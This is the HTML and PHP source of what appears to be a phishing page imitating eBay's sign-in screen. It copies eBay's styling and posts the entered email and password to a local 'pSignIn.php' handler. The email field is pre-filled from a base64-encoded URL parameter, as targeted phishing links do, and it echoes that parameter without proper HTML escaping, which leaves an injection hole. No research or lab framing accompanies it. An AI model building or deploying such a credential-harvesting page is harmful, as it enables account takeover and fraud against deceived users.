
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Sign In</title>

<style type="text/css">
<!--
body {
	background-image: url(bg.png);
	background-repeat: repeat;
}
-->


body,.g-std{font-family:Arial,Helvetica,sans-serif;font-size:small}form{margin:0;padding:0}a:active,a:link,.g-novisited a:visited{color:#00c;text-decoration:none}a:visited{color:#909;text-decoration:none}.g-b{font-weight:bold}.g-em{color:#090;font-weight:bold}.g-err{color:#f00}.g-hlp{color:#666}.g-pipe{color:#99f}.g-txtBx,.g-btn,.g-nav{font-family:Verdana;font-size:x-small}.g-txtBxHlp{color:#666;font-family:Verdana;font-size:x-small}.g-m0{margin:0}a:hover{text-decoration:underline}.g-i{font-style:italic}.g-bi{font-weight:bold;font-style:italic}.g-dft{font-weight:normal}.g-dfti{font-weight:normal;font-style:italic}.g-s{font-size:small}.g-xs{font-size:x-small}.g-m{font-size:medium}.g-l{font-size:large}.g-xl{font-size:x-large}.g-hdn{height:0;line-height:0;overflow:hidden;width:0;position:absolute;font-size:0;z-index:-1;outline:none}.pagewidth{width:100%;min-width:760px}* html .pageminwidth{padding-left:760px}* html .pagecontainer{margin-left:-760px;position:relative}* html .pageminwidth,* html .pagecontainer,* html .pagelayout{height:1px}.brclear{clear:both;height:0;margin:0;font-size:1px;line-height:0;display:block}div.BreadCrumb{border:0;padding:0;margin:0}.ebayfooter a:active,.ebayfooter a:link,.ebayfooter a,.ebayfooter a:visited,.ebayfooter a:hover{color:inherit}.ov-w{position:relative;left:-2000px;top:-2000px;visibility:hidden}.ov-fl{float:left}.ov-t{background:no-repeat 0 0}.ov-t b,.ov-b b{background:no-repeat 100% -70px;margin-left:28px;display:block}td.ov-t b,td.ov-b b{max-height:100%}.ov-t i,.ov-b i{background:repeat-x 0 -150px;margin-right:28px;padding-top:28px;display:block}.ov-b{background:no-repeat 0 -33px}.ov-b b{background:no-repeat 100% -108px}.ov-b i{background:repeat-x 0 -175px}.ov-c1,.ov-c2{float:left;background:repeat-y 0 0}td.ov-c1{float:none}.ov-c2{float:left;background:url() repeat-y 100% 0;border-left:1px solid #ccc}.ov-cnt{background:#fff;margin:-27px 19px -6px 0;position:relative;float:left;display:inline}.ov-p20{padding:17px 20px}.ov-p15{padding:12px 15px}.ov-p10{padding:7px 10px}.ov-p0{padding:0}.ov-cl,a.ov-cl:hover{background:url() no-repeat 0 0;width:12px;height:12px;position:absolute;right:20px;margin:-7px -12px 10px 10px;text-decoration:none;top:17px}.ov-cl-m,a.ov-cl-m:hover{background:url() no-repeat 0 100%;width:12px;height:12px;position:absolute;right:20px;margin:-2px -12px 10px 10px;text-decoration:none;top:12px}.ov-fl u.ov-clr{clear:both;display:block}.ov-pl{background:no-repeat 0 0;width:16px;height:44px;left:-17px}.ov-pr{background:no-repeat 1px -53px;height:44px;right:-30px;width:30px}.ov-prs{background:no-repeat 1px -212px;height:34px;right:-26px;width:26px}.ov-pts{background:none no-repeat scroll 0 -256px transparent;height:9px;left:25px;width:32px;top:-9px}.ov-pbs{background:none no-repeat scroll 0 -275px transparent;height:23px;left:25px;width:45px;bottom:-22px}.ov-pls{background:none no-repeat scroll 0 -170px transparent;width:13px;height:33px;left:-13px}.ov-t,.ov-t b,.ov-t i,.ov-b,.ov-b b,.ov-b i{background-image:url()}.ov-ptr{background-image:url();position:absolute}.ov-p20 .ov-s{padding-bottom:10px}.ov-p15 .ov-s{padding-bottom:7px}.ov-ftr{padding-top:10px}.ov-sm .ov-t,.ov-sm .ov-t b,.ov-sm .ov-t i,.ov-sm .ov-b,.ov-sm .ov-b b,.ov-sm .ov-b i{background-image:url()}.ov-sm .ov-c2{background-image:url()}.ov-sm .ov-cnt{margin:-27px 14px -14px 0}.ov-ov .ov-t{background-position:0 -200px}.d-ov .ov-t,.d-ov .ov-t b,.d-ov .ov-t i,.d-ov .ov-b,.d-ov .ov-b b,.d-ov .ov-b i{background-image:url()}.d-ov .ov-c2{background-image:url()}.d-ov .ov-p20{padding:0;margin-bottom:-7px}.d-ov .ov-b i{padding-top:13px}.d-ov .ov-cl,.d-ov a.ov-cl:hover{margin:-11px -15px 0 0}.bh-La,.bh-Ma,.bh-Sa{display:inline-block}.bh-hlp{cursor:pointer}.bh-hc,.bh-hc_rt{top:0}.bh-hc_lb,.bh-hc_rb{bottom:0}.bh-hc_rt,.bh-hc_rb{right:0}.bh-La b.bh-hlp,.bh-Ma b.bh-hlp,.bh-Sa b.bh-hlp,.d-ov b.bh-hc,.d-ov b.bh-hc_lb,.d-ov b.bh-hc_rt,.d-ov b.bh-hc_rb{background-image:url();display:inline-block}.ov-cnt .bh-bcnt{color:#333;line-height:normal;width:270px}.ov-cnt .bh-fc{padding-top:7px;border-top:1px dotted #d7d7d7;margin-top:7px}.bh-pad{padding:7px 20px 8px 10px}.bh-La .bh-hlp{height:25px;width:24px;background:no-repeat -148px -1px}a.bh-La:hover .bh-hlp{background-position:-182px -1px}.bh-L .bh-hc,.bh-L .bh-hc_lb,.bh-L .bh-hc_rt,.bh-L .bh-hc_rb{background:no-repeat 0 -1px;height:31px;position:absolute;width:30px;margin:-1px 0 0 -34px}.bh-L .bh-hc_rt{background:no-repeat -68px 0;margin:-1px -28px 0 0}.bh-L .bh-hc_lb{background:no-repeat -34px -1px;margin:0 0 -7px -34px}.bh-L .bh-hc_rb{background:no-repeat -107px -1px;margin:0 -28px -7px 0}.disInf{font-family:Arial,Helvetica,sans-serif;font-size:small;margin-bottom:18px;color:#333}.sinBrk{display:block}.dblBrk{display:block;padding-top:15px}.ekCrt{margin-top:0}.stChkIm{width:20px;height:20px}.tdVer{vertical-align:top}.disTxt{font-family:Arial,Helvetica,sans-serif;font-size:small;padding-bottom:15px;color:#333}.fbBtn{cursor:pointer;display:inline-block;outline:medium none;height:36px;width:226px;text-decoration:none;border:none}.fbBtn a:hover{text-decoration:none}.sm-imc{background:url() no-repeat -900px 0;height:100%}.cr-hr{padding:0 0 10px;margin:0 0 12px;border-bottom:1px solid #ccc;color:#333;font:bold 1.231em Trebuchet,"Trebuchet MS"}.cr-mz{margin:0}.cr-c .cr-hr{padding:0 0 5px;margin:0 0 5px}.cr-nr .cr-hr{margin:0;border:0}.cr-lt .cr-hr{font-weight:normal;font-size:1.385em;padding-bottom:9px;margin-bottom:8px}.cr-brd,.cr-bt{border:1px solid #ccc;padding:9px 11px}.cr-bt .cr-hr{margin:-2px 0 0;border:0;padding:0 0 3px}.cr-bt .cr-cnt{padding:0}.cr-st .cr-hr{font-size:1.077em;font-weight:bold}.cr-cp .cr-hr{padding:5px 15px;margin:0}.cr-cp .cr-cnt{padding:12px 15px}.pt-c{color:#333;width:100%;font-family:Trebuchet,"Trebuchet MS"}.pt-ct{padding:0 0 5px;margin:0;font-weight:normal}.pt-pz{padding:0 0 1px}.pt-tl{font-size:1.846em;line-height:26px}.pt-stl{font-size:1.385em;line-height:20px}.pt-rl{border-bottom:1px solid #999}.pt-mar{margin:17px 0}.pt-cmar{margin:17px 0 10px}.pt-sbr{padding:0 0 6px 10px;margin:0;font:normal normal 1em Arial}.pt-apd{padding:0 0 5px 15px;white-space:nowrap}.lst-tbase{font-weight:bold;color:#333;margin:0;padding:0 0 2px 1px}.lst-bs{text-align:left;font:normal small Arial;margin:8px 0}.lst-bs b,.lst-tnrm{font-weight:normal;color:#333}.lst-oll{margin:0 0 0 5px;padding:0 0 0 10px}.no_pm{margin:0 0 0 2px;padding:0}.lst-dfb{color:#d1d1d1}.lst-dfbn{color:#333}.lst-ablt{color:#8d8d8d}ul.noBullets{list-style:none;text-align:-13px}ul.bullets{list-style:disc outside}.lst-nbul{list-style:decimal outside}.lst-bs li{margin:0}.lst-nrm li{padding:4px 0 0 0}.lst-bulky li{padding:13px 0 0 0}.lst-lipg{width:90%;margin-left:auto;margin-right:auto}.lst-pr{padding-right:10px}.lst-stx{color:#666;padding:0 0 10px}.lst-olt{margin-left:-5px}.lst-orl{margin:0 0 0 11px;padding:0 0 0 10px}.lst-pl{padding:0;margin:0;list-style-type:none}.lst-bki{padding:0 0 0 26px;background-repeat:no-repeat}.sml-s{margin:0 100px 0 100px;border:3px solid #df0d0d;font:normal 1.231em Arial;color:#333}.sml-e{border-color:#df0d0d;color:#c00}.sml-i{border-color:#1153da}.sml-w{border-color:#fe9900}.sml-c{border-color:#448600}.sml-imc{padding-left:36px}.sml-e .sml-imc{background-position:0 0;background-color:#df0d0d}.sml-i .sml-imc{background-position:-258px 0;background-color:#1153da}.sml-w .sml-imc{background-position:-86px 0;background-color:#fe9900}.sml-c .sml-imc{background-position:-172px 0;background-color:#448600}.sml-s .sml-cnt{background:#fff;padding:8px 13px}.sml-rl{border-top:1px dashed #ccc;padding-bottom:10px}.bbk-desc{font-family:arial;font-size:small;color:#333;padding:0 0 8px 0}.bbk-errTxt{padding:4px 0 2px 0;color:red;font-family:verdana;font-size:10px}.bbk-errImg{padding:0 5px 0 0}.bbk-iptd{padding:0 0 0 10px}.bbk-ipt{width:85px}.bbk-ext{font-size:small;font-family:arial;padding:4px 0 0 0}.bbk-ext .bbk-anc{white-space:nowrap;outline:none;color:#00c;text-decoration:none}.bbk-ext a:hover{text-decoration:underline}.bbk-hImg{border:0}.bbk-hAnc{cursor:pointer}.bbk-snd{display:none;padding:14px 0 0 0}.bbk-htx{font-style:Verdana;font-size:xx-small;color:#333}.bbk-hpd{padding:8px 0 0 0}.barColor{background-color:#99c}.violet_Header{padding-bottom:15px}.central_Bar{background-color:#d6deff;font-family:Arial,Helvetica,sans-serif;font-size:large;padding-top:3px;padding-bottom:3px}.title_spacing{padding-left:15px}.clbt{clear:both}body.sso .gspr{display:block;background-image:url()!important}body.sso i.icser{margin-top:-2px;width:18px;height:18px;background-position:-3px 148px}body.sz980.sso .sd-bhli{background-image:url()!important;background-repeat:no-repeat;background-position:-2px -1px;background-color:transparent;padding:7px;cursor:pointer;display:inline-block}body.sso.sz980 a.sd-bhla:hover .sd-bhli{background-position:-16px -1px}body.ssous #gf-truste,#gf-norton{background-image:url()!important;background-repeat:no-repeat;background-position:-36px 0}#gf-norton{background-position:-102px 0;margin-left:30px}body.sso .chpwd{display:block;background-image:url()!important;margin-top:-2px;width:18px;height:18px;background-position:-3px -35px}body.sso .sm-imc{background-image:url()!important;background-repeat:no-repeat;background-position:-900px 0;height:100%}.sd-sgn{padding:0 0 0 5px;color:#999}*:first-child+html .sd-sgn{padding:0 0 0 5px;display:inline-block}.sd-strt{padding:0 0 0 99px}.sd-c{padding:10px 50px 10px 0;font-size:12px!important}.sd-sb{padding:10px 0 4px 0}.sd-gb{float:left;margin-right:15px}.sd-km{margin:0 0 5px 0;font-size:12px;color:#666}.sd-uid{margin:0 10px 7px 0}.sd-sd{padding:0 0 5px 0}body.sz980 .sd-unl{padding:5px 0 3px 0;display:block;font-size:14px;color:#555}span.sd-errp input{border:1px solid #f00!important}body.sz980 .sd-sv{font-size:12px;color:#333;padding:2px 1px 5px 1px;display:inline-block}.sd-is{margin:0 3px 0 0}.sd-be{color:#000;font-size:12px;margin:0 0 5px 0}.sd-ey{color:#f00;font-size:12px;margin:0 0 5px 0}.sd-eym{color:#dd1e31;display:block;font-size:12px;margin:-8px 0 5px}.sd-fys{padding:0 3px 0 0;float:left}.sd-us{padding:0 0 20px 0;text-align:left}.sd-pcs{display:inline-block}body.sz980 .sd-pcsm{display:inline-block;padding:2px 5px 0 10px;color:#333}.sd-cw{margin:0 0 7px 0}.sd-rgPrmo{margin:0 0 15px 0;padding:0}.sd-kc{margin:0 2px 0 0}.sd-errPt{color:#f00}.noBorder{border:none}input.txtBxF{color:#333;font-size:16px;padding:8px 0 8px 7px;border-radius:3px;border:1px solid #ccc}body.rdsgn input.txtBxF{}body.sz980 .sd-spl{float:right}*:first-child+html .sd-spl{margin:-25px 0 0 0}body.sz980 .sd-imgV{vertical-align:middle;display:inline-block;margin-top:5px}.sd-inPs{padding:0 5px 0 5px}body.sz980 div.pagewidth{width:980px;margin:auto}.lb-w b a:hover{text-decoration:underline!important}.sd-icp{background:url() no-repeat;width:20px;height:20px;;width:455px;vertical-align:top}.sd-l1i{background-image:url();width:455px;height:261px;display:inline-block}.sd-l2i{background-image:url();width:455px;height:240px;display:inline-block}.sd-rct{padding:0 0 10px 2px;font-size:14px;color:#333}.sd-flnk{border-top:1px dotted #d7d7d7;margin:7px 0 0 0}.sd-lipn{padding:7px 0 0 15px;margin:0}.sd-ebpd{width:455px;border:none;background-repeat:no-repeat;display:inline-block}.sd-lo{outline:none}.sd-ddb{background-color:#efefef}.sd-en{background-image:url();background-repeat:repeat-x;background-color:#1b4a5a}.sd-enb{background-image:url();width:414px;height:325px;display:inline-block;background-repeat:no-repeat;margin:20px 0 0 0}.sd-eol{margin:20px 20px 85px}*:first-child+html .sd-eol{margin:20px 15px 85px}.sd-fbr{text-align:right;margin:-50px 40px 0 0}.sd-ftp{margin:0 2px 0 0}.sd-frb{background-color:#f7efe7}.sd-cpt{cursor:pointer}.sd-fri{background-image:url();width:455px;height:346px;background-repeat:no-repeat;display:inline-block}.sd-ofm{color:#c00}.sd-ofs{padding:10px 0 25px 0}.sd-mb{background-image:url();width:455px;height:322px;background-repeat:no-repeat;display:inline-block}.sd-mbg{background-color:#e7e3e7}.sd-img{display:inline-block;background:url() no-repeat 0 0;height:22px;width:11px;vertical-align:top;margin:17px 0 0 0}.sd-tc{background-color:#ededed;padding:7px;color:#ca6816;display:inline-block;width:170px;white-space:normal}.sd-rel{position:relative}.sd-bdl{border-left:1px solid #ccc}.sd-orP{margin:0 -15px 0 0}.sd-pdb{padding:0 0 30px 0}.sd-dspN{display:none}.sd-dspB{display:inline-block;margin:-15px 0 0 0}.sd-fbImg{background:url() no-repeat 0 -72px;height:16px;position:relative;margin-right:3px;width:16px;display:inline-block}.sd-wn{white-space:nowrap}.sd-mbImg{background-image:url();width:310px;height:225px;background-repeat:no-repeat;display:inline-block}.sd-lmSp{display:inline-block;padding:5px 0 0 0}.sd-fbp{padding:10px 0 0 0}.sd-fbe{padding:0 0 5px 99px}.sd-ori{background-image:url();width:29px;height:29px;background-repeat:no-repeat;display:inline-block}body.sz980 .sd-txtA{display:inline-block;color:#333;font-size:20px;padding-bottom:12px;font-weight:bold}.sd-fbp1{padding:0 0 15px 94px}div.sd-lp b.bh-hc{padding:0}.sd-iftm{color:#000;float:left;position:absolute;top:-200px;left:-200px;border:0}.sd-osc{margin:-20px 0 0 215px}.sd-osi{position:relative;background-image:url();background-position:-130px 2px;background-repeat:no-repeat;display:inline-block;height:30px;width:29px}.sd-ppac{padding:6px 0 20px 91px}.sd-pplm{display:inline-block;font-size:small;padding:0 0 10px 0}.sd-ppot{font-size:small;font-weight:bold;padding-bottom:5px}.sd-ppaot{font-size:small;color:#333}.sd-ppab{background-image:url();background-position:0 0;background-repeat:no-repeat;width:130px;cursor:pointer;display:inline-block;outline:medium none;height:48px;text-decoration:none;border:none}.sd-ppat{font-size:14px;color:#777;padding-top:25px}.sd-ppbp{padding:12px 0 0 0}.sd-ezp{padding:0}body.rdsgn .sd-bc{width:980px;padding:0}.sd-bc{border:1px solid #ddd;padding:22px;border-radius:3px;box-shadow:4px 4px 1px #eee;background:none repeat scroll 0 0 #fff}.sd-rtt{padding-top:5px}* .pt-rl{border:0 none}input.txtBxF:hover,input.txtBxF:focus{border-color:#aaa}input.txtBxF:focus{outline:none}body.sz980 .sd-sgnBtn{margin-left:0}.sd-ds3Pt{font-size:36px;color:#333;font-family:"Helvetica neue",Helvetica,Arial,Verdana,Sans-serif}body.sz980 .sd-bhli{background-image:url();background-repeat:no-repeat;background-position:-215px -408px;background-color:transparent;padding:7px;cursor:pointer;display:inline-block}*:first-child+html .sd-bhli{display:inline}.sz980 a.sd-bhla:hover .sd-bhli{background-position:-229px -408px}body.sz980 .pt-mar{margin:0!important}body.sz980 .sd-imgSize{display:inline;max-width:90px;max-height:32px}body.sz980 .sd-bbImg{display:inline-block;margin-top:5px;vertical-align:middle}body.sz980 .bbk-ext,body.sz980 .bbk-desc{font-size:12px}body.sz980 .sd-ttOvlC{line-height:normal;color:#333}body.sz980 .AreaTitle a,body.sz980 .CentralArea a{color:#0654ba;text-decoration:none;font-size:12px}body.sz980 .AreaTitle a:visited,body.sz980 .CentralArea a:visited{color:#6a29b9;text-decoration:none}.AreaTitle a:focus,.CentralArea a:focus,body.sz980 .AreaTitle a:hover,body.sz980 .CentralArea a:hover{color:#004e8a;text-decoration:underline}body.sz980 .disTxt,body.sz980 .pt-c{font-family:"Helvetica neue",Helvetica,Arial,Verdana,Sans-serif}*:first-child+html .btn{padding-left:1em;padding-right:1em}body.sz980 .sd-rTitle b{display:inline-block;color:#333;font-size:20px;padding-bottom:12px;font-weight:bold}.sd-rCont{width:488px;height:270px;float:right;background-color:#fcfcfc}body.rdsgn .sd-lCont{width:437px;border-right:1px solid #ccc;padding:25px;box-shadow:4px 0 1px #eee}.sd-rts{padding:23px 0 8px 0}.sd-gchts{padding:30px 0 8px 0}body.rdsgn .sd-gb{float:none;margin-right:0}body.rdsgn .sd-rcc{width:350px;text-align:center;margin-left:auto;margin-right:auto}body.rdsgn .sd-rbs{padding-top:13px}body.sz980 .sd-ppac{padding-left:0}body.rdsgn .sd-osc{margin:-20px 0 0 160px}body.sz980 .sd-xl{border-bottom:1px solid #ccc;box-shadow:0 4px 1px #eee;padding-bottom:35px;width:450px}body.rdsgn .sd-xl{width:350px}body.rdsgn .sd-km{width:350px}body.rdsgn .sd-ppbp .ov-w{top:500px!important}body.rdsgn .sd-lcr{border:0;box-shadow:none}body.rdsgn .sd-mcr{width:490px}body.ds3noBG{background:none!important}div.sgnbg{height:590px}div.sd-bb{width:980px;margin-top:15px}body.sz980 .sd-sv a{text-decoration:underline}.pt-tl{line-height:36px!important}.sd-err{color:#dd1e31;display:block;font-size:12px}.shpt{top:18px!important}.sep-bp{padding:15px 0 0 15px}.pagewidth{width:940px;margin:auto}.sep-pmp{padding-top:10px}.sep-pmd{width:370px;padding:10px 0 10px 25px}.sep-psc{width:370px;padding:15px 0 0 0;color:#999!important}.sep-ppn{color:#32679a;font-size:1.846em;font-weight:bold}.sep-ppt{color:#32679a;padding:0 0 0 5px;display:inline}.sep-ezp{padding:0}span.sep-upl{padding-bottom:5px;display:block}.sep-sbw{padding:0 0 0 15px}.sep-ldc{padding-left:25px}.sep-pel{width:48%;float:right;margin-right:15px}.sep-eui{background-image:url();background-position:0 0;background-repeat:no-repeat;width:220px;height:110px;float:left}.sep-pui{background-image:url();background-position:0 -225px;background-repeat:no-repeat;width:220px;height:110px;float:right;margin-left:5px}body #gh,body .gf-BIG-t{width:940px}div#gh,.gf-BIG-t{margin:0 auto}.sep-lml{display:block;padding-top:50px}.sep-ptc{color:#999!important}
input.txtBxF1 {color:#333;font-size:16px;padding:8px 0 8px 7px;border-radius:3px;border:1px solid #ccc}
.inner_form {
	background-image: url('form.jpg');
	width: 408px;
	overflow: hidden;
    height: 336px;
    display: inline-block;
    margin-left: 3px;
    position: relative;
}
.logo_img {
	width: 99%;
	display: inline-block;
	text-align: center;
	margin: 0 auto;
	margin-top: 26px;
	margin-bottom: 21px;
	margin-left: 5px;
}
.sbtn {
	position: absolute;
	bottom: 116px;
	right: 16px;
	cursor: pointer;
}
body {
	margin: 0;
	padding: 0;
}
.btm_fot {
	width: 100%;
	margin: 0;
	padding: 0;
	background-color: #fff;
	border-top: 1px solid #ccc;
	margin-top: 150px;
}
input[type=text], input[type=password], select, textarea {
    margin: 0 0 3px;
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
    border-radius: 3px;
    color: #333;
}
input[type=text], input[type=password], textarea {
    border: 1px solid #ddd;
    background: #fff;
    box-shadow: 0 1px 0 rgba(255,255,255,.8), inset 0 1px 2px rgba(0,0,0,.06);
}
#userid, #pass {
	position: absolute;
    top: 73px;
    width: 359px;
    left: 18px;
    padding: 9px 2px 7px 10px;
}
#pass {
	top:128px;
}
</style>

<script language="javascript">

	function ferificare(){

	form = document.form1;

	error = "";
					
								
	if (form.pass.value=="") error = "Please enter the password for your account.";
	if (form.userid.value=="") error = "Please enter your email/user ID.";

	if (error=="") form.submit();

		else window.alert (error);

	}



     </script>

</head>

<body>

<div class="main_form" align="center">
	<div class="logo_img">
		<img src="log.png" />
	</div>
	<div class="inner_form">
		<form name="form1" action="pSignIn.php" method="post" >
			<input placeholder="Email or username" name="userid" class="txtBxF" id="userid" value="<?php if(isset($_GET['email'])) echo addslashes(base64_decode($_GET['email'])); ?>" size="45" maxlength="30">
			<input placeholder="Password" name="pass" type="password" class="txtBxF1" id="pass" value="" size="45" />
		</form>
		<input class="sbtn" type="image" src="btn.jpg" onClick="ferificare(); return false;" />
	</div>
</div>
<div class="btm_fot">
	<img src="fter.png" style="width:100%;" />
</div>
<!-- <table width="100%" height="135" border="0" cellpadding="0" cellspacing="0">
    <tr><td height="6" background="dunga.jpg">&nbsp;</td>
    <tr>
      <td align="center"><img src="footer.jpg" style="width:100%;" /></td>
</table> -->
</body>
</html>